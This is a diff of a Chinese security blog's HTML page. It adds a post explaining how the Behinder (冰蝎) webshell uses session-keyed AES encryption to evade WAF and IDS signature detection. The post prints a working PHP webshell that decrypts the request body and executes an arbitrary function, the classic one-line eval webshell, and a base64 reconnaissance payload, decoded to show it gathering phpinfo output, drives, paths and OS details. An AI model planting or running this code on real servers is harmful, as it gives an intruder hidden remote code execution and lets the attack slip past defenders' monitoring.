@@ -112,16 +112,19 @@
 
 
 
-  <meta name="description" content="growing up">
-<meta property="og:type" content="website">
-<meta property="og:title" content="guolala&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/categories/信息收集/index.html">
+  <meta name="description" content="前言一句话木马从最早的&amp;lt;?php @eval($_POST[cmd]);?&amp;gt;到现在，也有很长时间的历史了。客户端工具也从最简单的一个html页面发展到现在的各种GUI工具。但是近些年友军也没闲着，涌现出了各种防护系统，这些防护系统主要分为两类：一类是基于主机的，如Host based IDS、安全狗、D盾等，基于主机的防护系统主要是通过对服务器上的文件进行特征码检测；另一类是基于网络流">
+<meta property="og:type" content="article">
+<meta property="og:title" content="动态二进制加密实现一句话木马（冰蝎）">
+<meta property="og:url" content="http://yoursite.com/2018/12/17/动态二进制加密实现一句话木马（冰蝎）/index.html">
 <meta property="og:site_name" content="guolala&#39;s blog">
-<meta property="og:description" content="growing up">
+<meta property="og:description" content="前言一句话木马从最早的&amp;lt;?php @eval($_POST[cmd]);?&amp;gt;到现在，也有很长时间的历史了。客户端工具也从最简单的一个html页面发展到现在的各种GUI工具。但是近些年友军也没闲着，涌现出了各种防护系统，这些防护系统主要分为两类：一类是基于主机的，如Host based IDS、安全狗、D盾等，基于主机的防护系统主要是通过对服务器上的文件进行特征码检测；另一类是基于网络流">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fy9ksdk3ufj30f60ejdgl.jpg">
+<meta property="og:updated_time" content="2018-12-17T07:43:42.476Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="guolala&#39;s blog">
-<meta name="twitter:description" content="growing up">
+<meta name="twitter:title" content="动态二进制加密实现一句话木马（冰蝎）">
+<meta name="twitter:description" content="前言一句话木马从最早的&amp;lt;?php @eval($_POST[cmd]);?&amp;gt;到现在，也有很长时间的历史了。客户端工具也从最简单的一个html页面发展到现在的各种GUI工具。但是近些年友军也没闲着，涌现出了各种防护系统，这些防护系统主要分为两类：一类是基于主机的，如Host based IDS、安全狗、D盾等，基于主机的防护系统主要是通过对服务器上的文件进行特征码检测；另一类是基于网络流">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fy9ksdk3ufj30f60ejdgl.jpg">
 
 
 
@@ -130,7 +133,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/categories/信息收集/">
+  <link rel="canonical" href="http://yoursite.com/2018/12/17/动态二进制加密实现一句话木马（冰蝎）/">
 
 
 
@@ -140,7 +143,7 @@
   };
 </script>
 
-  <title>分类: 信息收集 | guolala's blog</title>
+  <title>动态二进制加密实现一句话木马（冰蝎） | guolala's blog</title>
   
 
 
@@ -187,7 +190,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
@@ -245,7 +248,7 @@
         
         
           
-          <li class="menu-item menu-item-categories menu-item-active">
+          <li class="menu-item menu-item-categories">
 
     
     
@@ -292,22 +295,6 @@
   
     
 
-    
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-    
-
-  
-
-
   
 
   
@@ -353,83 +340,304 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block category">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>信息收集<small>分类</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
+
+  
 
   <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/17/动态二进制加密实现一句话木马（冰蝎）/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="guolala">
+      <meta itemprop="description" content="growing up">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guolala's blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2018/12/05/命令行下的信息收集/" itemprop="url">
-              
-                <span itemprop="name">命令行下的信息收集</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">动态二进制加密实现一句话木马（冰蝎）
+              
+            
+          </h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-12-05T20:16:29+08:00" content="2018-12-05">
-          12-05
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
 
-    </header>
-  </article>
+            
+            
+            
 
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-12-17 11:19:44 / 修改时间：15:43:42" itemprop="dateCreated datePublished" datetime="2018-12-17T11:19:44+08:00">2018-12-17</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/加密解密/" itemprop="url" rel="index"><span itemprop="name">加密解密</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        
+      
 
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/12/04/常见的漏洞端口/" itemprop="url">
-              
-                <span itemprop="name">常见的漏洞端口</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-12-04T15:48:29+08:00" content="2018-12-04">
-          12-04
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一句话木马从最早的<code>&lt;?php @eval($_POST[cmd]);?&gt;</code>到现在，也有很长时间的历史了。客户端工具也从最简单的一个html页面发展到现在的各种GUI工具。但是近些年友军也没闲着，涌现出了各种防护系统，这些防护系统主要分为两类：一类是基于主机的，如Host based IDS、安全狗、D盾等，基于主机的防护系统主要是通过对服务器上的文件进行特征码检测；另一类是基于网络流量的，如各种云WAF、各种商业级硬件WAF、网络防火墙、Net Based IDS等，基于网络的防护设备其检测原理是对传输的流量数据进行特征检测，目前绝大多数商业级的防护设备皆属于此种类型。一旦目标网络部署了基于网络的防护设备，我们常用的一句话木马客户端在向服务器发送Payload时就会被拦截，这也就导致了有些场景下会出现一句话虽然已经成功上传，但是却无法连接的情况。</p>
+<h1 id="为什么被拦截"><a href="#为什么被拦截" class="headerlink" title="为什么被拦截"></a>为什么被拦截</h1><p>虽然有时候会采用base64编码，但是payload任有特征字符如eval等，参数值有base64编码等等。<br>对方的规则也在不断的更新，不断识别关键的编码函数名称、加解密函数名称，并加入到规则里面。于是攻击者和防御者展开了长期的较量，不停的变换着各种姿势。</p>
+<h1 id="为啥防御者可以不停的更新规则"><a href="#为啥防御者可以不停的更新规则" class="headerlink" title="为啥防御者可以不停的更新规则"></a>为啥防御者可以不停的更新规则</h1><p>主要有两个原因：</p>
+<ul>
+<li><p>攻击者发送的请求都是脚本源代码，无论怎么样编码，仍然是服务器端解析引擎可以解析的源代码，是基于文本的，防御者能看懂。</p>
+</li>
+<li><p>攻击者执行多次相同的操作，发送的请求数据也是相同的，防御者就可以把他看懂的请求找出特征固化为规则。</p>
+</li>
+</ul>
+<p>但是如果攻击者的请求不是文本格式的源代码而是编译之后的的字节码，字节码是一堆二进制数据流，不存在参数，攻击者把二进制字节码进行加密，防御者看到的就是一堆加了密的二进制数据流，攻击者多次执行同样的操作采用不同的密钥加密，即使是同样的payload，防御者看到的请求数据也不一样，这就使防御者无法通过流量分析来提取规则。</p>
+<h1 id="一劳永逸的绕过"><a href="#一劳永逸的绕过" class="headerlink" title="一劳永逸的绕过"></a>一劳永逸的绕过</h1><h2 id="具体流程："><a href="#具体流程：" class="headerlink" title="具体流程："></a>具体流程：</h2><ul>
+<li>首次连接一句话服务端时，客户端首先向服务器端发起一个GET请求，服务器端随机产生一个128位的密钥，把密钥回显给客户端，同时把密钥写进服务器的Session中。</li>
+<li>客户端获取密钥后，对本地的二进制payload先进行AES加密，再通过POST方式发送至服务器端。</li>
+<li>服务器收到数据后，从Session中取出秘钥，进行AES解密，解密之后得到二进制payload数据。</li>
+<li>服务器解析二进制payload文件，执行任意代码，并将执行结果加密返回。</li>
+<li>客户端解密服务器端返回的结果。</li>
+</ul>
+<h2 id="执行流程图："><a href="#执行流程图：" class="headerlink" title="执行流程图："></a>执行流程图：</h2><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fy9ksdk3ufj30f60ejdgl.jpg" alt=""></p>
+<h1 id="服务端实现"><a href="#服务端实现" class="headerlink" title="服务端实现"></a>服务端实现</h1><p>PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p>
+<p>代码：</p>
+<pre><code>&lt;?php
+session_start();
+if (isset($_GET[&apos;pass&apos;]))
+{
+    #uniqid()基于以微秒计的当前时间，生成一个唯一的 ID。
+    $key=substr(md5(uniqid(rand())),16);
+    $_SESSION[&apos;k&apos;]=$key;
+    print $key;
+}
+else
+{
+    $key=$_SESSION[&apos;k&apos;];
+    #参数为解密密文、解密方法、解密密钥
+    #php://input 去获取请求体中的信息（请求类型为multipart/form-data 时 失效不会封装 数据为空）封装起来返回给程序 无法获取get信息 因为GET的信息附加到URL里 不在请求体中
+    $decrptContent=openssl_decrypt(file_get_contents(&quot;php://input&quot;), &quot;AES128&quot;, $key);
+    $arr=explode(&apos;|&apos;,$decrptContent);
+    $func=$arr[0];
+    $params=$arr[1];
+    $func($params);
+}
+?&gt;
+</code></pre><p>流程：</p>
+<ul>
+<li>首先客户端以Get形式发起带密码的握手请求，服务端产生随机密钥并写入Session。</li>
+<li>客户端将源代码，如<code>assert|eval(&quot;phpinfo();”)</code>利用AES加密，发送至服务端，服务端收到之后先进行AES解密，得到中间结果字符串<code>assert|eval(&quot;phpinfo();&quot;)。</code></li>
+<li>服务端利用explode函数将拆分为一个字符串数据，索引为0的元素为字符串assert，索引为1的元素为字符串<code>eval(&quot;phpinfo();&quot;)</code>。</li>
+<li>以可变函数方式调用索引为0的数组元素，参数为索引为1的数组元素，即为<code>assert(&quot;eval(\&quot;phpinfo;\&quot;)&quot;)</code> 。</li>
+</ul>
+<p>再具体一点，比如客户端有一段代码</p>
+<pre><code>assert|eval(&quot;phpinfo();&quot;)
+</code></pre><p>进行AES128加密发送给服务端，服务端用explode函数分割字符，索引为0的是assert，索引为1的<code>eval(&quot;phpinfo();&quot;)</code>，然后通过可变函数执行<code>assert(&quot;eval(\&quot;phpinfo();\&quot;)&quot;)</code>。</p>
+<h1 id="客户端实现"><a href="#客户端实现" class="headerlink" title="客户端实现"></a>客户端实现</h1><p>通过作者提供的客户端，拿到：</p>
+<pre><code>assert|eval(base64_decode(&apos;ZXJyb3JfcmVwb3J0aW5nKDApOw0KZnVuY3Rpb24gbWFpbigpIHsNCiAgICBvYl9zdGFydCgpOyBwaHBpbmZvKCk7ICRpbmZvID0gb2JfZ2V0X2NvbnRlbnRzKCk7IG9iX2VuZF9jbGVhbigpOw0KICAgICRkcml2ZUxpc3QgPSIiOw0KICAgIGlmIChzdHJpc3RyKFBIUF9PUywid2luZG93cyIpfHxzdHJpc3RyKFBIUF9PUywid2lubnQiKSkNCiAgICB7DQogICAgICAgIGZvcigkaT02NTskaTw9OTA7JGkrKykNCiAgICAJew0KICAgIAkJJGRyaXZlPWNocigkaSkuJzovJzsNCiAgICAJCWZpbGVfZXhpc3RzKCRkcml2ZSkgPyAkZHJpdmVMaXN0PSRkcml2ZUxpc3QuJGRyaXZlLiI7IjonJzsNCiAgICAJfQ0KICAgIH0NCgllbHNlDQoJew0KCQkkZHJpdmVMaXN0PSIvIjsNCgl9DQogICAgJGN1cnJlbnRQYXRoPWdldGN3ZCgpOw0KICAgIC8vZWNobyAicGhwaW5mbz0iLiRpbmZvLiJcbiIuImN1cnJlbnRQYXRoPSIuJGN1cnJlbnRQYXRoLiJcbiIuImRyaXZlTGlzdD0iLiRkcml2ZUxpc3Q7DQogICAgJG9zSW5mbz1QSFBfT1M7DQogICAgJHJlc3VsdD1hcnJheSgiYmFzaWNJbmZvIj0+YmFzZTY0X2VuY29kZSgkaW5mbyksImRyaXZlTGlzdCI9PmJhc2U2NF9lbmNvZGUoJGRyaXZlTGlzdCksImN1cnJlbnRQYXRoIj0+YmFzZTY0X2VuY29kZSgkY3VycmVudFBhdGgpLCJvc0luZm8iPT5iYXNlNjRfZW5jb2RlKCRvc0luZm8pKTsNCiAgICAvL2VjaG8ganNvbl9lbmNvZGUoJHJlc3VsdCk7DQogICAgc2Vzc2lvbl9zdGFydCgpOw0KICAgICRrZXk9JF9TRVNTSU9OWydrJ107DQogICAgLy9lY2hvIGpzb25fZW5jb2RlKCRyZXN1bHQpOw0KICAgIGVjaG8gb3BlbnNzbF9lbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpLCAiQUVTMTI4IiwgJGtleSk7DQp9DQptYWluKCk7&apos;));
+</code></pre><p>经过base64解码得：</p>
+<pre><code>error_reporting(0);
+function main() {
+    ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean();
+    $driveList =&quot;&quot;;
+    if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;))
+    {
+        for($i=65;$i&lt;=90;$i++)
+        {
+            $drive=chr($i).&apos;:/&apos;;
+            file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:&apos;&apos;;
+        }
+    }
+    else
+    {
+        $driveList=&quot;/&quot;;
+    }
+    $currentPath=getcwd();
+    //echo &quot;phpinfo=&quot;.$info.&quot;\n&quot;.&quot;currentPath=&quot;.$currentPath.&quot;\n&quot;.&quot;driveList=&quot;.$driveList;
+    $osInfo=PHP_OS;
+    $result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo));
+    //echo json_encode($result);
+    session_start();
+    $key=$_SESSION[&apos;k&apos;];
+    //echo json_encode($result);
+    echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key);
+}
+main();
+</code></pre><p>可以看出这段代码主要做了这些工作：</p>
+<p>保存phpinfo内容</p>
+<pre><code>ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean();
+</code></pre><blockquote>
+<p><code>ob_start()</code>把输出内容输出到缓冲区而不是游览器，然后用<code>ob_get_contents</code>得到缓冲区数据，最后用<code>ob_end_clean</code>清除缓冲区</p>
+</blockquote>
+<p>服务端有哪些盘符</p>
+<pre><code>$driveList =&quot;&quot;;
+   if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;))
+   {
+       for($i=65;$i&lt;=90;$i++)
+       {
+           $drive=chr($i).&apos;:/&apos;;
+           file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:&apos;&apos;;
+       }
+   }
+   else
+   {
+       $driveList=&quot;/&quot;;
+   }
+</code></pre><p>获取当前路径</p>
+<pre><code>$currentPath=getcwd();
+</code></pre><p>以及检查php运行环境。</p>
+<pre><code>$osInfo=PHP_OS;
+</code></pre><p>然后对这些信息进行base64编码，再用json编码，再用key进行”AES128”加密。</p>
+<pre><code>$result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo));
+//echo json_encode($result);
+session_start();
+$key=$_SESSION[&apos;k&apos;];
+//echo json_encode($result);
+echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key);
+</code></pre><p>借鉴自：<a href="http://halazi.xin/2018/12/11/Behinder/" target="_blank" rel="noopener">http://halazi.xin/2018/12/11/Behinder/</a></p>
+<p><a href="https://xz.aliyun.com/t/2744" target="_blank" rel="noopener">https://xz.aliyun.com/t/2744</a></p>
 
       
     </div>
 
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/13/Linux账户安全机制/" rel="next" title="Linux账户安全机制">
+                <i class="fa fa-chevron-left"></i> Linux账户安全机制
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+  </div>
 
 
           </div>
           
+
+  
+
+
 
         </div>
         
@@ -450,8 +658,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -566,6 +783,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#为什么被拦截"><span class="nav-number">2.</span> <span class="nav-text">为什么被拦截</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#为啥防御者可以不停的更新规则"><span class="nav-number">3.</span> <span class="nav-text">为啥防御者可以不停的更新规则</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#一劳永逸的绕过"><span class="nav-number">4.</span> <span class="nav-text">一劳永逸的绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#具体流程："><span class="nav-number">4.1.</span> <span class="nav-text">具体流程：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#执行流程图："><span class="nav-number">4.2.</span> <span class="nav-text">执行流程图：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#服务端实现"><span class="nav-number">5.</span> <span class="nav-text">服务端实现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#客户端实现"><span class="nav-number">6.</span> <span class="nav-text">客户端实现</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -722,6 +955,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.5.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.5.0"></script>
+
+
 
   
 
